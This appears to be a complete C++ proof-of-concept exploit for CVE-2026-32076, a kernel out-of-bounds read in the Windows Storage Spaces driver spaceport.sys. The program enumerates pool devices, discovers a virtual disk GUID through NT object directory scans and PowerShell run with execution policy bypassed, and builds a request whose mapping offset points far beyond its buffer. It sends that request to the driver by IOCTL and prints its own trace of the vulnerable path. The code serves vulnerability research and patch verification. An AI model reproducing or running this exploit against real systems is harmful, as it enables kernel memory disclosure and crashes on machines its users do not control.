#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>

#ifndef DIRECTORY_QUERY
#define DIRECTORY_QUERY 0x0001
#endif

#ifndef STATUS_NO_MORE_ENTRIES
#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001AL)
#endif

#define IOCTL_SP_MAP_EXTENTS 0xE7C204
#define SDB_MAP_INFO_HEADER_SIZE 0x38
#define POC_INPUT_SIZE 0x80
#define POC_MAPPING_LENGTH 0x20
#define POC_MAPPING_OFFSET 0x1000

typedef NTSTATUS(NTAPI* PFN_NT_OPEN_DIRECTORY_OBJECT)(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS(NTAPI* PFN_NT_QUERY_DIRECTORY_OBJECT)(HANDLE DirectoryHandle, PVOID Buffer, ULONG Length, BOOLEAN ReturnSingleEntry, BOOLEAN RestartScan, PULONG Context, PULONG ReturnLength);

typedef struct _POC_OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} POC_OBJECT_DIRECTORY_INFORMATION;

typedef struct _SDB_MAP_INFO_POC {
    ULONG HeaderSize;
    ULONG TotalLength;
    BYTE Reserved0[0x10];
    GUID SpaceId;
    ULONG MappingLength1;
    ULONG MappingOffset1;
    ULONG MappingLength2;
    ULONG MappingOffset2;
} SDB_MAP_INFO_POC;

static_assert(sizeof(SDB_MAP_INFO_POC) == SDB_MAP_INFO_HEADER_SIZE, "SDB_MAP_INFO_POC must be 0x38 bytes");

static PFN_NT_OPEN_DIRECTORY_OBJECT g_NtOpenDirectoryObject = NULL;
static PFN_NT_QUERY_DIRECTORY_OBJECT g_NtQueryDirectoryObject = NULL;

static void InitUnicodeString(UNICODE_STRING* value, const WCHAR* text) {
    if (value == NULL) {
        return;
    }

    value->Buffer = const_cast<PWSTR>(text);
    value->Length = 0;
    value->MaximumLength = 0;

    if (text == NULL) {
        return;
    }

    size_t cch = wcslen(text);
    size_t maxCch = (0xFFFFu - sizeof(WCHAR)) / sizeof(WCHAR);
    if (cch > maxCch) {
        cch = maxCch;
    }

    value->Length = (USHORT)(cch * sizeof(WCHAR));
    value->MaximumLength = (USHORT)(value->Length + sizeof(WCHAR));
}

static BOOL UnicodeStringStartsWith(const UNICODE_STRING* value, const WCHAR* prefix) {
    if (value == NULL || value->Buffer == NULL || prefix == NULL) {
        return FALSE;
    }

    size_t prefixCch = wcslen(prefix);
    size_t valueCch = value->Length / sizeof(WCHAR);
    if (valueCch < prefixCch) {
        return FALSE;
    }

    return wcsncmp(value->Buffer, prefix, prefixCch) == 0;
}

static BOOL WideStringStartsWith(const WCHAR* value, const WCHAR* prefix) {
    if (value == NULL || prefix == NULL) {
        return FALSE;
    }

    return wcsncmp(value, prefix, wcslen(prefix)) == 0;
}

static BOOL CopyUnicodeStringToBuffer(const UNICODE_STRING* source, WCHAR* destination, DWORD destinationCch) {
    if (source == NULL || source->Buffer == NULL || destination == NULL || destinationCch == 0) {
        return FALSE;
    }

    DWORD copyCch = source->Length / sizeof(WCHAR);
    if (copyCch >= destinationCch) {
        copyCch = destinationCch - 1;
    }

    memcpy(destination, source->Buffer, copyCch * sizeof(WCHAR));
    destination[copyCch] = L'\0';
    return TRUE;
}

static BOOL CopyWideString(WCHAR* destination, DWORD destinationCch, const WCHAR* source) {
    if (destination == NULL || destinationCch == 0 || source == NULL) {
        return FALSE;
    }

    if (wcsncpy_s(destination, destinationCch, source, _TRUNCATE) != 0) {
        return FALSE;
    }

    return TRUE;
}

static BOOL ConvertArgToWide(const char* source, WCHAR* destination, DWORD destinationCch) {
    if (source == NULL || destination == NULL || destinationCch == 0) {
        return FALSE;
    }

    int written = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, source, -1, destination, destinationCch);
    if (written == 0) {
        written = MultiByteToWideChar(CP_ACP, 0, source, -1, destination, destinationCch);
    }

    return written != 0;
}

static void PrintUsage(const char* exeName) {
    const char* name = exeName != NULL ? exeName : "poc_cve-2026-32076.exe";
    printf("Usage: %s [pool-device-path] [--space-guid {GUID}]\n", name);
    printf("       %s\n", "\\\\.\\Pool#{GUID}");
    printf("       %s\n", "\\\\?\\GLOBALROOT\\Device\\Pool#{GUID}");
    printf("       %s --space-guid {VIRTUAL-DISK-GUID}\n", name);
    printf("PowerShell helper: Get-VirtualDisk | Select FriendlyName,UniqueId,ObjectId,Path | fl\n");
}

static int HexValueA(char ch) {
    if (ch >= '0' && ch <= '9') {
        return ch - '0';
    }

    if (ch >= 'a' && ch <= 'f') {
        return ch - 'a' + 10;
    }

    if (ch >= 'A' && ch <= 'F') {
        return ch - 'A' + 10;
    }

    return -1;
}

static BOOL ParseHexA(const char* text, size_t count, unsigned long* value) {
    if (text == NULL || value == NULL) {
        return FALSE;
    }

    unsigned long result = 0;
    for (size_t i = 0; i < count; i++) {
        int digit = HexValueA(text[i]);
        if (digit < 0) {
            return FALSE;
        }

        result = (result << 4) | (unsigned long)digit;
    }

    *value = result;
    return TRUE;
}

static BOOL ParseGuidAtA(const char* text, GUID* guid) {
    if (text == NULL || guid == NULL) {
        return FALSE;
    }

    const char* p = text;
    if (*p == '{') {
        p++;
    }

    unsigned long data1 = 0;
    unsigned long data2 = 0;
    unsigned long data3 = 0;
    unsigned long data4[8] = { 0 };
    if (!ParseHexA(p, 8, &data1) || p[8] != '-') {
        return FALSE;
    }

    p += 9;
    if (!ParseHexA(p, 4, &data2) || p[4] != '-') {
        return FALSE;
    }

    p += 5;
    if (!ParseHexA(p, 4, &data3) || p[4] != '-') {
        return FALSE;
    }

    p += 5;
    for (int i = 0; i < 2; i++) {
        if (!ParseHexA(p + (i * 2), 2, &data4[i])) {
            return FALSE;
        }
    }

    if (p[4] != '-') {
        return FALSE;
    }

    p += 5;
    for (int i = 2; i < 8; i++) {
        if (!ParseHexA(p + ((i - 2) * 2), 2, &data4[i])) {
            return FALSE;
        }
    }

    guid->Data1 = (unsigned long)data1;
    guid->Data2 = (unsigned short)data2;
    guid->Data3 = (unsigned short)data3;
    for (int i = 0; i < 8; i++) {
        guid->Data4[i] = (unsigned char)data4[i];
    }

    return TRUE;
}

static BOOL ParseCompactGuidAtA(const char* text, GUID* guid) {
    if (text == NULL || guid == NULL) {
        return FALSE;
    }

    unsigned long parts[16] = { 0 };
    for (int i = 0; i < 16; i++) {
        if (!ParseHexA(text + (i * 2), 2, &parts[i])) {
            return FALSE;
        }
    }

    guid->Data1 = (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3];
    guid->Data2 = (unsigned short)((parts[4] << 8) | parts[5]);
    guid->Data3 = (unsigned short)((parts[6] << 8) | parts[7]);
    for (int i = 0; i < 8; i++) {
        guid->Data4[i] = (unsigned char)parts[i + 8];
    }

    return TRUE;
}

static BOOL FindGuidInTextA(const char* text, GUID* guid) {
    if (text == NULL || guid == NULL) {
        return FALSE;
    }

    for (const char* p = text; *p != '\0'; p++) {
        if ((*p == '{' && ParseGuidAtA(p, guid)) || ParseGuidAtA(p, guid) || ParseCompactGuidAtA(p, guid)) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL FindGuidInTextW(const WCHAR* text, GUID* guid) {
    if (text == NULL || guid == NULL) {
        return FALSE;
    }

    char converted[1024] = { 0 };
    int written = WideCharToMultiByte(CP_UTF8, 0, text, -1, converted, sizeof(converted), NULL, NULL);
    if (written == 0) {
        return FALSE;
    }

    return FindGuidInTextA(converted, guid);
}

static void PrintGuid(const char* prefix, const GUID* guid) {
    if (guid == NULL) {
        return;
    }

    printf("%s{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\n", prefix != NULL ? prefix : "", (unsigned long)guid->Data1, guid->Data2, guid->Data3, guid->Data4[0], guid->Data4[1], guid->Data4[2], guid->Data4[3], guid->Data4[4], guid->Data4[5], guid->Data4[6], guid->Data4[7]);
}

static BOOL RunCommandAndFindGuidW(const WCHAR* commandLineTemplate, GUID* guid) {
    if (commandLineTemplate == NULL || guid == NULL) {
        return FALSE;
    }

    WCHAR commandLine[1024] = { 0 };
    if (!CopyWideString(commandLine, ARRAYSIZE(commandLine), commandLineTemplate)) {
        return FALSE;
    }

    SECURITY_ATTRIBUTES securityAttributes{};
    securityAttributes.nLength = sizeof(securityAttributes);
    securityAttributes.bInheritHandle = TRUE;
    securityAttributes.lpSecurityDescriptor = NULL;

    HANDLE readPipe = NULL;
    HANDLE writePipe = NULL;
    if (!CreatePipe(&readPipe, &writePipe, &securityAttributes, 0)) {
        return FALSE;
    }

    if (!SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0)) {
        CloseHandle(readPipe);
        CloseHandle(writePipe);
        return FALSE;
    }

    STARTUPINFOW startupInfo{};
    PROCESS_INFORMATION processInfo{};
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    startupInfo.hStdOutput = writePipe;
    startupInfo.hStdError = writePipe;

    BOOL created = CreateProcessW(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo);
    CloseHandle(writePipe);
    if (!created) {
        CloseHandle(readPipe);
        return FALSE;
    }

    char output[8192] = { 0 };
    DWORD used = 0;
    for (;;) {
        char chunk[512] = { 0 };
        DWORD bytesRead = 0;
        BOOL readOk = ReadFile(readPipe, chunk, sizeof(chunk) - 1, &bytesRead, NULL);
        if (!readOk || bytesRead == 0) {
            break;
        }

        DWORD room = (DWORD)sizeof(output) - used - 1;
        DWORD toCopy = bytesRead < room ? bytesRead : room;
        if (toCopy > 0) {
            memcpy(output + used, chunk, toCopy);
            used += toCopy;
            output[used] = '\0';
        }
    }

    WaitForSingleObject(processInfo.hProcess, INFINITE);
    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);
    CloseHandle(readPipe);
    return FindGuidInTextA(output, guid);
}

static BOOL DiscoverFirstSpaceGuidFromDosDevices(GUID* guid) {
    if (guid == NULL) {
        return FALSE;
    }

    WCHAR dosDevices[65536] = { 0 };
    DWORD chars = QueryDosDeviceW(NULL, dosDevices, ARRAYSIZE(dosDevices));
    if (chars == 0) {
        return FALSE;
    }

    for (const WCHAR* name = dosDevices; *name != L'\0'; name += wcslen(name) + 1) {
        if ((WideStringStartsWith(name, L"Space#") || WideStringStartsWith(name, L"Global\\Space#")) && FindGuidInTextW(name, guid)) {
            printf("[+] Discovered virtual disk GUID from DOS link: %ls\n", name);
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL DiscoverFirstVirtualDiskGuid(GUID* guid) {
    if (guid == NULL) {
        return FALSE;
    }

    const WCHAR* commands[] = {
        L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Get-VirtualDisk | Select-Object -First 1 -ExpandProperty UniqueId\"",
        L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"(Get-VirtualDisk | Select-Object -First 1).ObjectId\"",
        L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"(Get-VirtualDisk | Select-Object -First 1).Path\"",
        NULL
    };

    for (int i = 0; commands[i] != NULL; i++) {
        if (RunCommandAndFindGuidW(commands[i], guid)) {
            printf("[+] Discovered virtual disk GUID with PowerShell method %d\n", i + 1);
            return TRUE;
        }
    }

    return DiscoverFirstSpaceGuidFromDosDevices(guid);
}

static BOOL TryPoolDevicePath(const WCHAR* candidate, WCHAR* devicePath, DWORD devicePathCch) {
    if (candidate == NULL || devicePath == NULL || devicePathCch == 0) {
        return FALSE;
    }

    HANDLE device = CreateFileW(candidate, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        printf("[.] Pool device candidate failed: %ls (error %lu)\n", candidate, GetLastError());
        return FALSE;
    }

    CloseHandle(device);
    if (!CopyWideString(devicePath, devicePathCch, candidate)) {
        return FALSE;
    }

    printf("[+] Openable pool device candidate: %ls\n", candidate);
    return TRUE;
}

static BOOL TryPoolNameFormats(const WCHAR* poolName, const WCHAR* const* formats, WCHAR* devicePath, DWORD devicePathCch) {
    if (poolName == NULL || formats == NULL || devicePath == NULL || devicePathCch == 0) {
        return FALSE;
    }

    WCHAR candidate[MAX_PATH] = { 0 };
    for (int i = 0; formats[i] != NULL; i++) {
        if (swprintf_s(candidate, ARRAYSIZE(candidate), formats[i], poolName) <= 0) {
            continue;
        }

        if (TryPoolDevicePath(candidate, devicePath, devicePathCch)) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL FindPoolDeviceWithQueryDosDevice(WCHAR* devicePath, DWORD devicePathCch) {
    if (devicePath == NULL || devicePathCch == 0) {
        return FALSE;
    }

    WCHAR dosDevices[65536] = { 0 };
    DWORD chars = QueryDosDeviceW(NULL, dosDevices, ARRAYSIZE(dosDevices));
    if (chars == 0) {
        return FALSE;
    }

    static const WCHAR* plainFormats[] = { L"\\\\.\\%ls", L"\\\\.\\Global\\%ls", NULL };
    static const WCHAR* globalFormats[] = { L"\\\\.\\%ls", NULL };

    for (const WCHAR* name = dosDevices; *name != L'\0'; name += wcslen(name) + 1) {
        if (WideStringStartsWith(name, L"Pool#")) {
            if (TryPoolNameFormats(name, plainFormats, devicePath, devicePathCch)) {
                return TRUE;
            }
        }
        else if (WideStringStartsWith(name, L"Global\\Pool#")) {
            if (TryPoolNameFormats(name, globalFormats, devicePath, devicePathCch)) {
                return TRUE;
            }
        }
    }

    return FALSE;
}

static BOOL FindPoolDeviceInNtDirectory(const WCHAR* directoryPath, const WCHAR* const* candidateFormats, WCHAR* devicePath, DWORD devicePathCch) {
    if (directoryPath == NULL || candidateFormats == NULL || devicePath == NULL || devicePathCch == 0 || g_NtOpenDirectoryObject == NULL || g_NtQueryDirectoryObject == NULL) {
        return FALSE;
    }

    UNICODE_STRING name;
    OBJECT_ATTRIBUTES objectAttributes;
    HANDLE directoryHandle = NULL;
    InitUnicodeString(&name, directoryPath);
    InitializeObjectAttributes(&objectAttributes, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = g_NtOpenDirectoryObject(&directoryHandle, DIRECTORY_QUERY, &objectAttributes);
    if (status < 0) {
        return FALSE;
    }

    BYTE buffer[65536] = { 0 };
    ULONG context = 0;
    BOOL found = FALSE;
    for (BOOL first = TRUE; ; first = FALSE) {
        ULONG returnLength = 0;
        status = g_NtQueryDirectoryObject(directoryHandle, buffer, sizeof(buffer), FALSE, first, &context, &returnLength);
        if (status == STATUS_NO_MORE_ENTRIES || status < 0) {
            break;
        }

        POC_OBJECT_DIRECTORY_INFORMATION* info = (POC_OBJECT_DIRECTORY_INFORMATION*)buffer;
        BYTE* end = buffer + sizeof(buffer);
        unsigned int guard = 0;
        while ((BYTE*)(info + 1) <= end && info->Name.Length > 0 && guard < 4096) {
            WCHAR objectName[MAX_PATH] = { 0 };
            BOOL isPool = UnicodeStringStartsWith(&info->Name, L"Pool#");
            BOOL copied = CopyUnicodeStringToBuffer(&info->Name, objectName, ARRAYSIZE(objectName));
            if (isPool && copied && TryPoolNameFormats(objectName, candidateFormats, devicePath, devicePathCch)) {
                found = TRUE;
                break;
            }

            info++;
            guard++;
        }

        if (found) {
            break;
        }
    }

    CloseHandle(directoryHandle);
    return found;
}

static BOOL ResolveNtApiFunctions() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll == NULL) {
        return FALSE;
    }

    FARPROC openDirectory = GetProcAddress(ntdll, "NtOpenDirectoryObject");
    FARPROC queryDirectory = GetProcAddress(ntdll, "NtQueryDirectoryObject");
    if (openDirectory == NULL || queryDirectory == NULL) {
        return FALSE;
    }

    memcpy(&g_NtOpenDirectoryObject, &openDirectory, sizeof(g_NtOpenDirectoryObject));
    memcpy(&g_NtQueryDirectoryObject, &queryDirectory, sizeof(g_NtQueryDirectoryObject));
    return g_NtOpenDirectoryObject != NULL && g_NtQueryDirectoryObject != NULL;
}

static BOOL FindFirstPoolDevice(WCHAR* devicePath, DWORD devicePathCch) {
    static const WCHAR* globalDosFormats[] = { L"\\\\.\\Global\\%ls", L"\\\\?\\GLOBALROOT\\GLOBAL??\\%ls", NULL };
    static const WCHAR* localDosFormats[] = { L"\\\\.\\%ls", L"\\\\.\\Global\\%ls", L"\\\\?\\GLOBALROOT\\GLOBAL??\\%ls", NULL };
    static const WCHAR* deviceFormats[] = { L"\\\\?\\GLOBALROOT\\Device\\%ls", NULL };

    printf("[+]   method 1: QueryDosDeviceW multi-sz scan\n");
    if (FindPoolDeviceWithQueryDosDevice(devicePath, devicePathCch)) {
        return TRUE;
    }

    printf("[+]   method 2: NT directory scan of \\\\Global??\n");
    if (FindPoolDeviceInNtDirectory(L"\\Global??", globalDosFormats, devicePath, devicePathCch)) {
        return TRUE;
    }

    printf("[+]   method 3: NT directory scan of \\\\??\n");
    if (FindPoolDeviceInNtDirectory(L"\\??", localDosFormats, devicePath, devicePathCch)) {
        return TRUE;
    }

    printf("[+]   method 4: NT directory scan of \\\\DosDevices\\\\Global\n");
    if (FindPoolDeviceInNtDirectory(L"\\DosDevices\\Global", globalDosFormats, devicePath, devicePathCch)) {
        return TRUE;
    }

    printf("[+]   method 5: NT directory scan of \\\\Device for direct Pool# objects\n");
    if (FindPoolDeviceInNtDirectory(L"\\Device", deviceFormats, devicePath, devicePathCch)) {
        return TRUE;
    }

    return FALSE;
}

static void PrintMapInfo(const SDB_MAP_INFO_POC* mapInfo, DWORD inputLength) {
    if (mapInfo == NULL) {
        return;
    }

    printf("[+] SDB_MAP_INFO layout:\n");
    printf("    +0x00 HeaderSize     = 0x%08lX\n", (unsigned long)mapInfo->HeaderSize);
    printf("    +0x04 TotalLength    = 0x%08lX\n", (unsigned long)mapInfo->TotalLength);
    PrintGuid("    +0x18 SpaceId        = ", &mapInfo->SpaceId);
    printf("    +0x28 MappingLength1 = 0x%08lX\n", (unsigned long)mapInfo->MappingLength1);
    printf("    +0x2C MappingOffset1 = 0x%08lX  <-- OOB (buffer is only 0x%lX)\n", (unsigned long)mapInfo->MappingOffset1, (unsigned long)inputLength);
    printf("    +0x30 MappingLength2 = 0x%08lX\n", (unsigned long)mapInfo->MappingLength2);
    printf("    +0x34 MappingOffset2 = 0x%08lX\n", (unsigned long)mapInfo->MappingOffset2);
}

static void PrintValidationTrace(const SDB_MAP_INFO_POC* mapInfo, DWORD inputLength) {
    if (mapInfo == NULL) {
        return;
    }

    printf("[+] Validation trace:\n");
    printf("    InputLength(0x%lX) >= 0x38                    -> PASS\n", (unsigned long)inputLength);
    printf("    HeaderSize == 0x38                            -> PASS\n");
    printf("    InputLength(0x%lX) >= TotalLength(0x%lX)        -> PASS\n", (unsigned long)inputLength, (unsigned long)mapInfo->TotalLength);
    printf("    FindSpaceById(SpaceId)                        -> uses +0x18 GUID later\n");
    printf("    MappingLength1(0x%lX) + 0x38 <= TotalLength    -> 0x%lX <= 0x%lX PASS\n", (unsigned long)mapInfo->MappingLength1, (unsigned long)(mapInfo->MappingLength1 + SDB_MAP_INFO_HEADER_SIZE), (unsigned long)mapInfo->TotalLength);
    printf("    Mappings() = base + 0x%lX                     -> OOB POINTER\n", (unsigned long)mapInfo->MappingOffset1);
    printf("    RangeCount = *(base + 0x%lX + 4)              -> OOB READ\n", (unsigned long)mapInfo->MappingOffset1);
}

int main(int argc, char** argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[+] CVE-2026-32076 PoC: spaceport.sys OOB Read trigger probe\n\n");

    printf("[+] Stage 1: Parse command line\n");
    const char* devicePathArgument = NULL;
    GUID spaceId = {};
    BOOL haveSpaceId = FALSE;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            PrintUsage(argv[0]);
            return 0;
        }

        if (strcmp(argv[i], "--space-guid") == 0) {
            if (i + 1 >= argc || !FindGuidInTextA(argv[i + 1], &spaceId)) {
                printf("[-] --space-guid requires a GUID argument\n");
                PrintUsage(argv[0]);
                return 1;
            }

            haveSpaceId = TRUE;
            i++;
            continue;
        }

        if (argv[i][0] == '-') {
            printf("[-] Unknown option: %s\n", argv[i]);
            PrintUsage(argv[0]);
            return 1;
        }

        if (devicePathArgument != NULL) {
            printf("[-] Multiple pool device paths were provided\n");
            PrintUsage(argv[0]);
            return 1;
        }

        devicePathArgument = argv[i];
    }

    printf("[+] Stage 2: Resolve NT API functions\n");
    if (!ResolveNtApiFunctions()) {
        printf("[-] Failed to resolve NtOpenDirectoryObject or NtQueryDirectoryObject\n");
        return 1;
    }

    printf("[+] NtOpenDirectoryObject = %p\n", (void*)g_NtOpenDirectoryObject);
    printf("[+] NtQueryDirectoryObject = %p\n", (void*)g_NtQueryDirectoryObject);

    WCHAR devicePath[MAX_PATH] = { 0 };
    if (devicePathArgument != NULL) {
        printf("[+] Stage 3: Use pool device path from command line\n");
        if (!ConvertArgToWide(devicePathArgument, devicePath, ARRAYSIZE(devicePath))) {
            printf("[-] Failed to convert the pool device path to UTF-16\n");
            return 1;
        }

        printf("[+] Pool device path: %ls\n", devicePath);
    }
    else {
        printf("[+] Stage 3: Enumerate Storage Spaces pool devices\n");
        if (!FindFirstPoolDevice(devicePath, ARRAYSIZE(devicePath))) {
            printf("[-] No Storage Spaces pool device found\n");
            printf("[-] Create a Storage Spaces pool or pass a pool device path manually\n");
            PrintUsage(argv[0]);
            return 1;
        }

        printf("[+] Found pool device: %ls\n", devicePath);
    }

    printf("[+] Stage 4: Resolve target Storage Spaces virtual disk GUID\n");
    if (!haveSpaceId) {
        if (!DiscoverFirstVirtualDiskGuid(&spaceId)) {
            printf("[-] Failed to discover a virtual disk GUID automatically\n");
            printf("[-] Run: Get-VirtualDisk | Select FriendlyName,UniqueId,ObjectId,Path | fl\n");
            printf("[-] Then pass the matching value with --space-guid {GUID}\n");
            return 1;
        }

        haveSpaceId = TRUE;
    }

    PrintGuid("[+] SpaceId used in SDB_MAP_INFO +0x18: ", &spaceId);

    printf("[+] Stage 5: Open pool device handle\n");
    HANDLE device = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFileW failed (error %lu)\n", GetLastError());
        return 1;
    }

    printf("[+] Device handle: %p\n", (void*)device);

    printf("[+] Stage 6: Craft SDB_MAP_INFO with OOB MappingOffset1\n");
    BYTE inputBuffer[POC_INPUT_SIZE] = { 0 };
    BYTE outputBuffer[POC_INPUT_SIZE] = { 0 };
    SDB_MAP_INFO_POC* mapInfo = (SDB_MAP_INFO_POC*)inputBuffer;
    mapInfo->HeaderSize = SDB_MAP_INFO_HEADER_SIZE;
    mapInfo->TotalLength = POC_INPUT_SIZE;
    mapInfo->SpaceId = spaceId;
    mapInfo->MappingLength1 = POC_MAPPING_LENGTH;
    mapInfo->MappingOffset1 = POC_MAPPING_OFFSET;
    mapInfo->MappingLength2 = 0;
    mapInfo->MappingOffset2 = 0;
    PrintMapInfo(mapInfo, POC_INPUT_SIZE);
    PrintValidationTrace(mapInfo, POC_INPUT_SIZE);

    printf("[+] Stage 7: Send IOCTL 0x%lX (map-extents)\n", (unsigned long)IOCTL_SP_MAP_EXTENTS);
    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(device, IOCTL_SP_MAP_EXTENTS, inputBuffer, POC_INPUT_SIZE, outputBuffer, POC_INPUT_SIZE, &bytesReturned, NULL);
    DWORD lastError = GetLastError();
    printf("[+] DeviceIoControl result: %s\n", ok ? "TRUE" : "FALSE");
    printf("[+] LastError: 0x%08lX\n", (unsigned long)lastError);
    printf("[+] BytesReturned: %lu\n", (unsigned long)bytesReturned);

    if (!ok) {
        printf("\n[!] IOCTL returned error 0x%08lX\n", (unsigned long)lastError);
        printf("[!] On an affected driver, the OOB RangeCount read can occur before a later transaction returns an error\n");
        if (lastError == ERROR_NOT_FOUND) {
            printf("[!] ERROR_NOT_FOUND usually maps to STATUS_NOT_FOUND after the IntegrityCheck path\n");
        }
    }
    else {
        printf("\n[!] IOCTL succeeded and the crafted request was accepted by the driver\n");
    }

    printf("[+] Expected vulnerable path on an affected driver:\n");
    printf("[+]   1. SpPoolMapExtents -> SDB_MAP_INFO::IntegrityCheck\n");
    printf("[+]   2. IntegrityCheck -> SDB_MAP_INFO::Mappings(this)\n");
    printf("[+]   3. Mappings returns SystemBuffer + 0x1000 as SDB_RANGES*\n");
    printf("[+]   4. IntegrityCheck executes mov ecx, dword ptr [rax+4]\n");
    printf("[+]   5. The read targets SystemBuffer + 0x1004, 0xF84 bytes beyond the 0x80-byte input buffer\n");
    printf("[+] Kernel-side confirmation requires WinDbg, verifier, or crash telemetry\n");

    CloseHandle(device);
    printf("\n[+] Done\n");
    return 0;
}
